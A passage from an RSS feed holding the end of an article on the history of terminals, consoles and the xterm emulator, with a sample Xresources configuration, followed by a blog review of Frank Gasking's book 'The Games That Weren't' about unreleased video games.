    <li><a href="#the-shell">The shell</a>
        <ul>
            <li><a href="#popular-shells">Popular shells</a>
                <ul>
                    <li><a href="#bourne-shell">Bourne shell</a></li>
                    <li><a href="#c-shell">C shell</a></li>
                    <li><a href="#ksh">Ksh</a></li>
                    <li><a href="#bash">Bash</a></li>
                    <li><a href="#tcsh">tcsh</a></li>
                    <li><a href="#zsh">Zsh</a></li>
                    <li><a href="#ash">Ash</a></li>
                    <li><a href="#dash">DASH</a></li>
                    <li><a href="#fish">fish</a></li>
                </ul>
            </li>
            <li><a href="#what-shell-should-i-use">What shell should I use?</a></li>
        </ul>
    </li>
    <li><a href="#further-reading">Further reading</a></li>
</ul>

<h2 id="the-terminal-and-the-console">The terminal and the console</h2>

<p>Early computers where huge machines that consisted of multiple cabinets, e.g. one cabinet for the CPU, one or more cabinets for tape drives, one cabinet for each disk drive, one cabinet for a punched card reader and one cabinet for a high speed printer. The image below is a Univac 9400 system from 1967 consisting of several cabinets.</p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-9400.jpg" alt="A Univac 9400 Mainframe"><br><span>A Univac 9400 mainframe computer.</span></p>

<p>The "console" was the "control console". In the pictures below is a "UNIVAC 1" control console and a "UNIVAC 2" control console.</p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-1-control-console.png" alt="UNIVAC 1 control console"><br><span>A UNIVAC 1 control console.</span></p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-2-control-console.png" alt="UNIVAC 2 control console"><br><span>A UNIVAC 2 control console.</span></p>

<p>The word terminal comes from the Latin "terminus", meaning "an end, a limit, boundary line", indicating that it's the terminating end or "terminal" end of a communications process. You will sometimes hear the description "a dumb terminal" when referring to a text-based environment where the computer is <i>just taking input and showing text</i> while the real work happens at the other end, typically in a <a href="https://en.wikipedia.org/wiki/Mainframe_computer">mainframe</a>.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Teleprinter">teleprinter</a> or TTY was the first kind of terminal. Rather than a monitor you would have a literal typewriter in front of you. When you typed on it, you would see the text on a piece of paper and that text would be send to the computer. When the computer replied, you would see the typewriter print on the paper. Some models could also be used to create punched tape for data storage (either from typed input or from data received from a remote source) and to read back such tape for local printing or transmission.</p>

<p>In the picture below is a Teletype 33 ASR Teleprinter. It was introduced in 1963 as an electro-mechanical teleprinter and it was one of the most popular terminals in the communications industry. The ASR stands for <b>A</b>utomatic <b>S</b>end and <b>R</b>eceive. The ASR 33 had a built-in punched tape reader and tape punch which allowed the user to save programs.</p>

<p><img src="https://www.unixsheikh.com/includes/images/asr33.jpg" alt="33 ASR Teleprinter"><br><span>A Teletype Model 33 ASR teleprinter, usable as a terminal.</span></p>

<p><b>NOTE:</b><br>If you're interested I can highly recommend that you take a look at Charles Baetsen's Hobby Page as he has a wealth of information about the <a href="https://va3ngc.weebly.com/asr-33-documentation.html">Teletype 33 ASR</a> in the form of both user manuals, installations manuals and videos.</p>

<p>In the picture below Ken Thompson (sitting) and Dennis Ritchie (standing) is using a 33 ASR teleprinter connected to a <a href="https://en.wikipedia.org/wiki/PDP-11">PDP-11</a>, the picture is from 1972.</p>

<p><img src="https://www.unixsheikh.com/includes/images/thompson-ritchie-pdp-11.png" alt="Ken Thompson and Dennis Ritchie"></p>

<p>Later, as computers became much smaller, it was possible to integrate multiple components into one single unit, with both a video monitor and a keyboard put together inside it, and the "console" now became more or less synonymous to the "terminal". Both the "console" and the "terminal" now referred to the physical video terminal that had replaced both the teleprinter and the old control console.</p>

<p>The video terminal provides a way for the kernel and other processes to send text output on the monitor to the user, and to receive text input from the user via the keyboard.</p>

<p>The VT100 is a video terminal, introduced in August 1978 by Digital Equipment Corporation (DEC). It was one of the first terminals to support ANSI escape codes for cursor control and other tasks, and added a number of extended codes for special features like controlling the status lights on the keyboard. This led to rapid uptake of the ANSI standard, becoming the de facto standard for terminal emulators.</p>

<p><img src="https://www.unixsheikh.com/includes/images/dec-vt100.jpg" alt="DEC VT100"><br><span>A DEC VT100</span></p>

<p>The VT220 is an ANSI standard video terminal introduced by Digital Equipment Corporation (DEC) in November 1983. The VT240 added monochrome vector graphics support to the base model, while the VT241 did the same in color. The 200 series replaced the VT100 series. Among its major upgrades was a number of international character sets, as well as the ability to define new character sets, and a much lighter keyboard.</p>

<p><img src="https://www.unixsheikh.com/includes/images/dec-vt220.jpg" alt="DEC VT220"><br><span>A DEC VT220</span></p>

<p>Today, in the software world, "console" and "terminal" has become completely synonymous.</p>

<h3 id="the-virtual-terminal">The virtual terminal</h3>

<p>A virtual terminal or virtual console is a program that simulates a physical terminal. For example, both the Linux kernel and BSD kernels support virtual terminals - terminals that are logically separate, but which access the same physical keyboard and monitor.</p>

<p>The virtual terminal gives the impression that several independent terminals are running concurrently. Each virtual terminal can be logged in with a different user and it can run its own shell and have its own font settings. The virtual terminals each use a device <code>/dev/ttyX</code>, and you can switch between them by pressing <code>Alt+FX</code> (where <code>X</code> is equal to the virtual terminal number, beginning with 1).</p>

<h2 id="the-terminal-emulator">The terminal emulator</h2>

<p>Emulation refers to the ability of a computer program to emulate, i.e. imitate, another program or device. A terminal emulator is a computer program that emulates a physical terminal within some other display architecture, such as the <a href="https://en.wikipedia.org/wiki/X_Window_System">X Window System</a>.</p>

<p>Many different terminal emulators have been developed that emulate terminals such as the <a href="https://en.wikipedia.org/wiki/VT52">VT52</a>, <a href="https://en.wikipedia.org/wiki/VT100">VT100</a>, <a href="https://en.wikipedia.org/wiki/VT220">VT220</a>, <a href="https://en.wikipedia.org/wiki/VT320">VT320</a>, <a href="https://en.wikipedia.org/wiki/IBM_3270">IBM 3270/8/9/E</a>, <a href="https://en.wikipedia.org/wiki/IBM_5250">IBM 5250</a>, and many others.</p>

<p>The terminal emulator takes the input you type at the keyboard and convert those to <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> characters which it sends to the shell, or to a program running under the shell (more about the shell later). The terminal emulator also takes the stream of output characters from the various programs you run via the shell and displays them on the monitor.</p>

<p>The purpose of the terminal emulator is to allow access to the command line while working in a graphical user interface, such as the X Window System. Since the shell is "expecting" to interface with a human through a terminal, and we don't use a physical terminal while in a graphical environment, we need the terminal emulator.</p>

<p>You can see what terminal types are available on most Linux distributions by running <code>ls /lib/terminfo/*</code> (the path may be different on your system). On OpenBSD it's <code>ls /usr/share/terminfo/*</code></p>

<h4 id="xterm">xterm</h4>

<p><a href="https://invisible-island.net/xterm/xterm.html">xterm</a> was originally written as a stand-alone terminal emulator for the <a href="https://en.wikipedia.org/wiki/VAXstation#VAXstation_100">VAXStation 100 </a> (VS100) by Mark Vandevoorde, a student of <a href="https://en.wikipedia.org/wiki/Jim_Gettys">Jim Gettys</a>, who worked at <a href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC's</a> Cambridge Research Laboratory. It became clear that xterm would be more useful as part of X Window System than as a standalone program, so it was retargeted to the X Window System.</p>

<p>The xterm program is the default terminal emulator for the X Window System. It provides DEC VT102/VT220 features and other selected features from higher-level terminals such as VT320, VT420 and VT520. It also provides Tektronix 4014 emulation for programs that cannot use the window system directly. If the underlying operating system supports terminal resizing (for example, the SIGWINCH signal in systems derived from 4.3bsd), xterm will use the facilities to notify programs running in the window whenever it is resized.</p>

<p>Around 1996 the main line of development shifted to the <a href="https://en.wikipedia.org/wiki/XFree86">XFree86</a> implementation of the X Window System and xterm is now maintained by Thomas Dickey, who is also the current lead developer of <a href="https://en.wikipedia.org/wiki/Lynx_%28web_browser%29">Lynx</a>, a popular customizable text-based web browser.</p>

<p>Early versions of xterm emulated the VT102 and Tektronix 4014. Later versions added control sequences for DEC and other terminals such as:</p>
<ul>
    <li>VT220: Added in patch 24.</li>
    <li>VT320: Added in patch 24.</li>
    <li>VT420: DECSTR (soft terminal reset) was added in patch 34.</li>
    <li>VT520: Although not officially emulated, parts of VT520 features were implemented. Controls DECSMBV and DECSWBV for setting the margin- and warning-bell volume was added in patch 254.</li>
</ul>

<p>As with most X applications, xterm can be customized via global X resources files (e.g. <code>/usr/lib/X11/app-defaults/XTerm</code>), per-user resource files (e.g. <code>~/.Xresources</code>), or command-line arguments. Most of the command-line options correspond to resource settings, as noted in the <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a>.</p>

<p>While the name of the program is xterm, the X resource class in <code>~/.Xresources</code> is <code>XTerm</code>, e.g.:</p>

<pre>XTerm*utf8: 1</pre>

<p>The <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a> provides a full list of features and options.</p>

<p>xterm is still being actively developed, it works really great across many different systems, it has extremely low input latency, it has many hidden gems and it is my favorite terminal emulator! For that reason I'm going to share some settings you can use in your <code>~/.Xresources</code> file:</p>

<pre>XTerm*faceName: "DejaVu Sans Mono"
XTerm*faceSize: 12
XTerm*renderFont: true
! Dynamically change font size with CTRL+SHIFT+PageUp/PageDown
XTerm*faceSize1: 12
XTerm*faceSize2: 14
XTerm*faceSize3: 16
XTerm*faceSize4: 18
XTerm*faceSize5: 20
XTerm*faceSize6: 22
XTerm*utf8: 1
XTerm*termName: xterm-256color
XTerm*borderWidth: 0
XTerm*autohint: true
XTerm*backarrowKey: false
XTerm*bellIsUrgent: false
XTerm*cursorBlink: false
XTerm*ScrollKey: true
! Fix ALT key (check in mc with Alt+h)
XTerm*metaSendsEscape: true
XTerm*eightBitInput: false
XTerm*ttyModes: erase ^?
XTerm*fastScroll: true

! I like a lot of scrollback.
XTerm*saveLines: 100000

! Use CLIPBOARD by default.
XTerm*selectToClipboard: true
! Hack xterm to add selection to both PRIMARY and CLIPBOARD.
&lt;Btn1Up&gt;: select-end(PRIMARY, CLIPBOARD, CUT_BUFFER0)

! xterm defines a whole suite of ‚Ä¶</pre></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html">https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html</a></em></p>]]>
            </description>
            <link>https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788858</guid>
            <pubDate>Fri, 15 Jan 2021 09:44:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Games That Weren‚Äôt]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25788647">thread link</a>) | @rbanffy
<br/>
January 15, 2021 | https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/ | <a href="https://web.archive.org/web/*/https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1547">
	
	<div>
		
<p>Towards the end of of 1985, adverts started appearing in my Computer &amp; Video Games magazines for ‚Äúthe first ever computer cartoon‚Äù ‚Äì Scooby Doo in the Castle Mystery! And to a massive Scooby Doo fan like me, it was incredible! They were clearly Spectrum screenshots on there, but they definitely looked like nothing else, except maybe what a Spectrum port of something like Dragon‚Äôs Lair might look like‚Ä¶ which, the following year, we‚Äôd find out was more or less the case!</p>



<figure><img data-attachment-id="1537" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2381/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg" data-orig-size="2863,3817" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610281833&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;320&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2381" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=113 113w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>Anyway, as 1985 became 1986, previews started appearing that hinted at an interactive story involving a spooky Scottish castle belonging to Shaggy‚Äôs aunt, presented as cartoon action sequences that you directed to solve the mystery. And yes, it really was like a laser-disc game crammed into a 48K Spectrum! As the months passed, the big double-page, full colour adverts kept coming, but no sign of any game, then in March 1986, in an Elite preview exclusive, C&amp;VG said ‚Äúdespite what you‚Äôve read in other magazines, Elite still plans to release its computer cartoon adventure, Scooby Doo in the Castle Mystery for the 48K Spectrum,‚Äù but towards the end of the article also says that it won‚Äôt be in the ‚Äúheavily advertised‚Äù form because there wasn‚Äôt enough memory left to make it playable! And, of course, what we eventually got at the end of 1986 was the fantastic, but utterly brutal Scooby Doo, an arcade-platformer take on Kung-Fu Master, with some of my favourite graphics ever on the Spectrum! </p>



<figure><img data-attachment-id="1538" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/scooby-doo-180901-180209/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg" data-orig-size="960,720" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="scooby doo-180901-180209" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=960" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg 960w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=768 768w" sizes="(max-width: 960px) 100vw, 960px"></figure>



<p>As much as I love what we finally got, I still look at the original advert and wonder what could have been‚Ä¶ And I would have gotten away with it too, if it weren‚Äôt for you meddling 48K of memory! If only Sir Clive had come up with 128K a bit sooner it might all be different, but that‚Äôs the tale of my very first encounter with a game that weren‚Äôt. Wasn‚Äôt!</p>



<p>Fast forward to Christmas 2021, and I received a wonderful new book called The Games That Weren‚Äôt, written by Frank Gasking and published by my favourite retro-gaming book peddlars Bitmap Books, who are responsible for all kinds of equally wonderful stuff on my bulging bookshelves, but nothing that bulges quite as much as this 644-page hardback behemoth!</p>



<figure><img data-attachment-id="1539" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2341/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg" data-orig-size="2579,3439" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936167&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;400&quot;,&quot;shutter_speed&quot;:&quot;0.025&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2341" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=112 112w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>As someone that writes about games from time to time, I think I‚Äôm qualified to say that everything about this puts me to shame! The first thing you notice, the very first time you flick through it, is that it‚Äôs clearly an absolute labour of love, much like Frank‚Äôs website of the same name that he started way back in the nineties to document and find lost and unreleased games across many platforms. The next thing you notice is that it‚Äôs visually stunning ‚Äì even more so than Scooby Doo in the Castle Mystery! And then you realise that it‚Äôs so much more than that‚Ä¶</p>



<figure><img data-attachment-id="1540" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2343/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg" data-orig-size="3548,2661" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936217&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0090909090909091&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2343" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As games industry legend David Crane tells us in the foreword, this is all about games that never quite reached the game-playing public. Going all the way back to 1975 and up to 2015, the book covers 80 games that weren‚Äôt, and they weren‚Äôt for myriad reasons that all get unravelled here ‚Äì flawed game design, internal politics, over-ambition, poor hardware sales, high cartridge costs or cabinet costs, failed field tests, expired licenses, not being able to fit a computer cartoon into 48K‚Ä¶ Actually, I should say that Scooby Doo in the Castle Mystery didn‚Äôt make the cut here (which gives me hope that it still might arrive one day!), but some of the tales around these unreleased games are definitely mysteries worthy of Scooby and the gang!</p>



<figure><img data-attachment-id="1541" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2344/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg" data-orig-size="3817,2863" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936289&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.012658227848101&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2344" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Having spent some time in my stack of old game magazines just get my head around enough of the Scooby Doo story to mention it here, I can really empathise with Frank‚Äôs decades-long obsession with investigating these mysteries ‚Äì that 30 minutes putting together a timeline from first advert to previews, doubts, cancellations then something else emerging in its place was really fascinating! But where I‚Äôve just included a picture of an old copy of C&amp;VG, every game covered in The Games That Weren‚Äôt includes a load of development assets, screenshots, photos and artistic impressions ‚Äì all reproduced in the very highest quality and sometimes for the first time ‚Äì to illustrate the wonderfully in-depth analysis on each game.</p>



<figure><img data-attachment-id="1542" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2345/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg" data-orig-size="3746,2810" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936335&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.013698630136986&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2345" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Before we analyse that analysis, let‚Äôs quickly mention a few of those games to give us a bit of context, as well as what is probably my favourite thing about the book, which is not only discovering stuff you didn‚Äôt know existed, but discovering stuff you would have actually bought, and even seeing screenshots of it! And that‚Äôs why we‚Äôll start with Elite on the Nintendo Game Boy, which got to prototype stage then the deal with Ocean fell through and consigned it to history; another nice feature is that for each game it tells you if it‚Äôs available to play or not‚Ä¶ And apparently this one is, so definitely expect more from me on that in the future! We all know about Elite, but there‚Äôs an awful lot more that you probably won‚Äôt know anything about, such as Death Pit, Dick Special, Eye of the Moon, Virtua Hamster(!), Spitfire Fury  and Starring Charlie Chaplin to name but a few. There‚Äôs unreleased sequels like Heart of Yesod, Star Fox 2 and, er, Gazza 2. There‚Äôs all kinds of film licenses that (possibly thankfully) never saw the light of day like The Terminator, Lethal Weapon and Waterworld, as well as other licenses like Daffy Duck and Tony Hawk‚Äôs Shred Session. And then there‚Äôs the versions of games you probably do know but never made it, like Rescue on Fractalus! or Bubble Bobble, Ridge Racer or The Last Ninja‚Ä¶</p>



<figure><img data-attachment-id="1543" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2346/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg" data-orig-size="3637,2728" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936363&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2346" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I write this, the last game I played before I went to bed last night was Arcade Archives Frogger on Nintendo Switch, so I reckon that Frogger 2: Swampy‚Äôs Revenge on Nintendo 64 is the perfect place to talk about the actual meat of the game analysis you‚Äôre getting here! It starts with a title screen summarising the reason it weren‚Äôt ‚Äì cartridge costs in this case ‚Äì then the year it weren‚Äôt (2000), the developer, the platform and whether or not it‚Äôs available to play. Then we get some background history ‚Äì why Frogger epitomises 1980s arcades, the aim of the game, its reception and its ports. Then we get into what happened next; in the case of Frogger, it obviously never stopped being released on different platforms, but there was a Hasbro remake developed by Millenium Interactive in 1997 that leads us directly into the non-sequel. When Hasbro wanted a sequel, Millenium weren‚Äôt available to do it, so they approached Interactive Studios. We then hear from Philip Oliver, and then the project‚Äôs technical manager, Matt Cloy, who talks about the team and how they set about developing the game for the Nintendo 64. We get right into the development kits and all the juicy technical details here, right from the horse‚Äôs mouth, as well as some great detail on the process of developing then moving on from the earliest designs. </p>



<p>This turned into very much a 3D game, in stark contrast to the overhead 2D original, with complex geometries and some wild-sounding environments that weren‚Äôt too far removed from Super Mario Galaxy, years ahead of its time. But Hasbro didn‚Äôt like it! Need something more traditional, more 2D, more like Frogger. So then we hear about how it was all stripped back, the action became more immediate to the player, and a story was introduced involving Swampy the Crocodile being jealous of Frogger‚Äôs fame and fortune! At this point we start getting some really nice detail about how the game actually played as levels took shape and started to be tested and tweaked, and then there‚Äôs some substitutions made in the team to bring on some experience and make sure the game was brought home as planned. </p>



<figure><img data-attachment-id="1546" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2384/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg" data-orig-size="3884,2913" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610461038&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;200&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2384" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And then it was all brought down with a bang! Hasbro got cold feet on increasing cartridge production costs and lead times, and the prospect of any profit was becoming risky, so at 70% complete, the Nintendo 64 version was canned. Now we jump to the PlayStation, PC, Dreamcast and Game Boy Colour versions that did eventually make it into the wild, reviewed okay, but never really had a chance to sell properly because after a year Konami said they wanted it removed from sale because the licence had expired! Now we get into the fun part of years then passing, glitchy prototypes sneaking out into the hands of collectors, and later builds appearing that featured things like placeholder sounds from other games and Pac-Man styled frogspawn collecting that would never have made the final cut. Finally, we get to what happened next, where we are now with availability of the various unfinished states online, and how the developers feel about the project in retrospect. And as we‚Äôve already discussed, all those written words are supported by some beautiful visuals, in this case a full-page unpublished advert for the game including the Nintendo 64 logo at the top, and a selection of half-page, well-curated (and well-defined) screenshots that serve perfectly well to bring the game to life. It really is an incredibly polished package, and that‚Äôs all for just one of the eighty games!</p>



